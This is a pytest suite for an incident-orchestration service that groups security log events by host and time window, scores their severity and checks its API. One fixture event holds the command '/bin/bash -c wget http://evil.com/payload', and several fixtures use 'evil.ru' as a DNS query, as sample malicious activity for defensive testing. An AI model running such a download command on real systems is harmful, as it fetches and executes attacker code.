"""
Tests for Phase 5: Incident Orchestrator.

Three layers:
  Layer 1 -- Pure unit tests on grouping and severity logic (no network)
  Layer 2 -- API contract tests via FastAPI TestClient
  Layer 3 -- Behavioral / edge-case tests

The /analyze endpoint calls context-retrieval and genai-gateway internally.
During tests, those services are unavailable, so the orchestrator falls back
to empty context (graceful degradation). Tests assert on the shape and
correctness of the grouping and severity logic, not on LLM output.

HOW TO RUN:
    pytest services/incident-orchestrator/test_orchestrate.py -v
"""

import sys
import os
import time
from datetime import datetime, timezone

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "tools", "dataset-ingestor"))

from orchestrate import (
    app,
    _group_events,
    _compute_severity,
    _parse_ts,
    _event_to_summary,
    _build_prompt,
    EventInput,
    _WINDOW_MINUTES,
)

client = TestClient(app)


# ---------------------------------------------------------------------------
# Shared test fixtures
# ---------------------------------------------------------------------------

def make_event(
    log_type="deep_kernel",
    host="webserver-01",
    process="bash",
    user_id=1000,
    args="",
    dns_query="",
    timestamp="2021-05-16T17:13:14Z",
    sus=0,
    evil=0,
    feat_is_root=False,
    feat_shell=False,
    feat_network=False,
) -> EventInput:
    attrs = {
        "host_name":    host,
        "process_name": process,
        "user_id":      user_id,
        "args":         args,
    }
    if dns_query:
        attrs["dns_query"] = dns_query
    return EventInput(
        log_type=log_type,
        attributes=attrs,
        labels={"sus": sus, "evil": evil},
        features={
            "feat_is_root_user":   feat_is_root,
            "feat_args_has_shell": feat_shell,
            "feat_args_has_network": feat_network,
        },
        timestamp=timestamp,
    )


# ===========================================================================
# LAYER 1A -- Timestamp parser unit tests
# ===========================================================================

class TestParseTs:

    def test_iso_z_timestamp(self):
        epoch = _parse_ts("2021-05-16T17:13:14Z")
        assert epoch > 0

    def test_empty_string_returns_zero(self):
        assert _parse_ts("") == 0.0

    def test_invalid_string_returns_zero(self):
        assert _parse_ts("not-a-date") == 0.0

    def test_earlier_timestamp_less_than_later(self):
        t1 = _parse_ts("2021-05-16T17:00:00Z")
        t2 = _parse_ts("2021-05-16T17:30:00Z")
        assert t1 < t2


# ===========================================================================
# LAYER 1B -- Grouper unit tests
# ===========================================================================

class TestGrouper:

    def test_single_event_forms_one_group(self):
        events = [make_event()]
        groups = _group_events(events, window_minutes=10)
        assert len(groups) == 1

    def test_same_host_same_window_is_one_group(self):
        events = [
            make_event(host="host-a", timestamp="2021-05-16T10:00:00Z"),
            make_event(host="host-a", timestamp="2021-05-16T10:05:00Z"),
        ]
        groups = _group_events(events, window_minutes=10)
        total_events = sum(len(v) for v in groups.values())
        assert total_events == 2

    def test_different_hosts_form_separate_groups(self):
        events = [
            make_event(host="host-a"),
            make_event(host="host-b"),
        ]
        groups = _group_events(events, window_minutes=10)
        assert len(groups) == 2

    def test_same_host_different_windows_form_separate_groups(self):
        events = [
            make_event(host="host-c", timestamp="2021-05-16T10:00:00Z"),
            make_event(host="host-c", timestamp="2021-05-16T11:00:00Z"),  # 60 min later
        ]
        groups = _group_events(events, window_minutes=10)
        assert len(groups) == 2

    def test_event_without_host_goes_to_unknown_host(self):
        event = EventInput(
            log_type="dns",
            attributes={"dns_query": "evil.ru"},
            labels={"sus": 1, "evil": 0},
            timestamp="2021-05-16T10:00:00Z",
        )
        groups = _group_events([event], window_minutes=10)
        keys = list(groups.keys())
        assert any("unknown_host" in k or "evil.ru" in k or "10." in k or "unknown" in k for k in keys)

    def test_zero_timestamp_events_grouped_together(self):
        events = [
            EventInput(log_type="dns", attributes={}, labels={}, timestamp=""),
            EventInput(log_type="dns", attributes={}, labels={}, timestamp=""),
        ]
        groups = _group_events(events, window_minutes=10)
        # Both have epoch=0, so they land in the same bucket for the same host
        total_events = sum(len(v) for v in groups.values())
        assert total_events == 2

    def test_three_different_hosts(self):
        events = [make_event(host=f"host-{i}") for i in range(3)]
        groups = _group_events(events, window_minutes=10)
        assert len(groups) == 3


# ===========================================================================
# LAYER 1C -- Severity scorer unit tests
# ===========================================================================

class TestSeverityScorer:

    def test_evil_event_returns_critical(self):
        events = [make_event(evil=1)]
        assert _compute_severity(events) == "critical"

    def test_sus_with_root_user_returns_high(self):
        events = [make_event(sus=1, feat_is_root=True)]
        assert _compute_severity(events) == "high"

    def test_sus_with_shell_returns_high(self):
        events = [make_event(sus=1, feat_shell=True)]
        assert _compute_severity(events) == "high"

    def test_sus_with_network_tool_returns_high(self):
        events = [make_event(sus=1, feat_network=True)]
        assert _compute_severity(events) == "high"

    def test_sus_without_escalation_signals_returns_medium(self):
        events = [make_event(sus=1)]
        assert _compute_severity(events) == "medium"

    def test_benign_events_return_low(self):
        events = [make_event(sus=0, evil=0)]
        assert _compute_severity(events) == "low"

    def test_mixed_group_takes_worst_severity(self):
        events = [
            make_event(sus=0, evil=0),
            make_event(evil=1),
        ]
        assert _compute_severity(events) == "critical"

    def test_critical_beats_high(self):
        events = [
            make_event(sus=1, feat_is_root=True),
            make_event(evil=1),
        ]
        assert _compute_severity(events) == "critical"

    def test_empty_events_return_low(self):
        assert _compute_severity([]) == "low"


# ===========================================================================
# LAYER 1D -- EventSummary unit tests
# ===========================================================================

class TestEventSummary:

    def test_process_name_included(self):
        e = make_event(process="wget")
        s = _event_to_summary(e)
        assert s.process_name == "wget"

    def test_is_evil_set_correctly(self):
        e = make_event(evil=1)
        s = _event_to_summary(e)
        assert s.is_evil is True

    def test_is_sus_set_correctly(self):
        e = make_event(sus=1)
        s = _event_to_summary(e)
        assert s.is_sus is True

    def test_args_snippet_truncated_at_120_chars(self):
        e = make_event(args="A" * 300)
        s = _event_to_summary(e)
        assert len(s.args_snippet) <= 120

    def test_dns_query_included(self):
        e = make_event(log_type="dns", dns_query="evil.ru")
        e.attributes["dns_query"] = "evil.ru"
        s = _event_to_summary(e)
        assert s.dns_query == "evil.ru"


# ===========================================================================
# LAYER 1E -- Prompt builder unit tests
# ===========================================================================

class TestBuildPrompt:

    def _make_group_summary(self, severity="high"):
        return {
            "host": "webserver-01",
            "severity": severity,
            "event_count": 5,
            "evil_count": 0,
            "sus_count": 5,
            "window_start": "2021-05-16T17:00:00Z",
            "window_end":   "2021-05-16T17:10:00Z",
            "event_types":  ["deep_kernel"],
            "top_processes": ["bash", "wget"],
        }

    def test_prompt_contains_host(self):
        p = _build_prompt(self._make_group_summary(), [], [])
        assert "webserver-01" in p

    def test_prompt_contains_severity(self):
        p = _build_prompt(self._make_group_summary("critical"), [], [])
        assert "critical" in p

    def test_prompt_contains_task_section(self):
        p = _build_prompt(self._make_group_summary(), [], [])
        assert "TASK" in p

    def test_prompt_with_similar_events_includes_score(self):
        similar = [{"score": 0.95, "text": "process bash wget external ip"}]
        p = _build_prompt(self._make_group_summary(), similar, [])
        assert "0.95" in p or "score" in p.lower()

    def test_prompt_with_runbooks_includes_title(self):
        runbooks = [{"title": "Network Exfiltration Response", "severity": "high", "content": "Step 1: isolate host."}]
        p = _build_prompt(self._make_group_summary(), [], runbooks)
        assert "Network Exfiltration Response" in p


# ===========================================================================
# LAYER 2 -- API contract tests
# ===========================================================================

class TestHealth:

    def test_returns_200(self):
        assert client.get("/health").status_code == 200

    def test_status_is_ok(self):
        data = client.get("/health").json()
        assert data["status"] == "ok"

    def test_dependencies_field_present(self):
        data = client.get("/health").json()
        assert "dependencies" in data

    def test_dependency_names(self):
        deps = client.get("/health").json()["dependencies"]
        assert "context_retrieval" in deps
        assert "genai_gateway" in deps
        assert "elasticsearch" in deps


class TestAnalyzeContract:

    def _req(self, events, window_minutes=10):
        return {
            "events": events,
            "window_minutes": window_minutes,
            "caller_id": "test-suite",
        }

    def _make_event_payload(self, sus=1, evil=0, host="host-01",
                             ts="2021-05-16T17:13:14Z"):
        return {
            "log_type": "deep_kernel",
            "attributes": {
                "host_name": host,
                "process_name": "bash",
                "user_id": 0,
                "args": "/bin/bash -c wget http://evil.com/payload",
            },
            "labels": {"sus": sus, "evil": evil},
            "features": {"feat_is_root_user": True, "feat_args_has_shell": True},
            "timestamp": ts,
        }

    def test_returns_200_for_valid_request(self):
        resp = client.post("/analyze", json=self._req([self._make_event_payload()]))
        assert resp.status_code == 200

    def test_response_has_report_id(self):
        data = client.post("/analyze", json=self._req([self._make_event_payload()])).json()
        assert "report_id" in data
        assert len(data["report_id"]) > 0

    def test_response_has_groups(self):
        data = client.post("/analyze", json=self._req([self._make_event_payload()])).json()
        assert "groups" in data
        assert isinstance(data["groups"], list)

    def test_response_has_overall_severity(self):
        data = client.post("/analyze", json=self._req([self._make_event_payload()])).json()
        assert data["overall_severity"] in ("critical", "high", "medium", "low")

    def test_single_event_produces_one_group(self):
        data = client.post("/analyze", json=self._req([self._make_event_payload()])).json()
        assert data["total_groups"] == 1

    def test_evil_event_produces_critical_severity(self):
        data = client.post("/analyze", json=self._req([self._make_event_payload(evil=1)])).json()
        assert data["overall_severity"] == "critical"

    def test_two_different_hosts_produce_two_groups(self):
        events = [
            self._make_event_payload(host="host-a"),
            self._make_event_payload(host="host-b"),
        ]
        data = client.post("/analyze", json=self._req(events)).json()
        assert data["total_groups"] == 2

    def test_same_host_same_window_produces_one_group(self):
        events = [
            self._make_event_payload(host="host-c", ts="2021-05-16T17:00:00Z"),
            self._make_event_payload(host="host-c", ts="2021-05-16T17:05:00Z"),
        ]
        data = client.post("/analyze", json=self._req(events, window_minutes=10)).json()
        assert data["total_groups"] == 1

    def test_group_has_event_count(self):
        data = client.post("/analyze", json=self._req([self._make_event_payload()])).json()
        group = data["groups"][0]
        assert "event_count" in group
        assert group["event_count"] >= 1

    def test_group_has_llm_summary(self):
        data = client.post("/analyze", json=self._req([self._make_event_payload()])).json()
        group = data["groups"][0]
        assert "llm_summary" in group
        assert isinstance(group["llm_summary"], str)

    def test_empty_events_returns_422(self):
        resp = client.post("/analyze", json=self._req([]))
        assert resp.status_code == 422

    def test_window_minutes_zero_returns_422(self):
        resp = client.post("/analyze", json={
            "events": [self._make_event_payload()],
            "window_minutes": 0,
            "caller_id": "test",
        })
        assert resp.status_code == 422

    def test_total_events_matches_input(self):
        events = [self._make_event_payload() for _ in range(3)]
        data = client.post("/analyze", json=self._req(events)).json()
        assert data["total_events"] == 3

    def test_generated_at_is_present(self):
        data = client.post("/analyze", json=self._req([self._make_event_payload()])).json()
        assert "generated_at" in data
        assert "T" in data["generated_at"]  # ISO format includes 'T'

    def test_groups_sorted_by_severity_desc(self):
        events = [
            self._make_event_payload(host="host-low",  sus=0, evil=0),
            self._make_event_payload(host="host-crit", sus=0, evil=1),
            self._make_event_payload(host="host-med",  sus=1, evil=0),
        ]
        data = client.post("/analyze", json=self._req(events)).json()
        severities = [g["severity"] for g in data["groups"]]
        order = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        assert all(
            order[severities[i]] >= order[severities[i + 1]]
            for i in range(len(severities) - 1)
        )
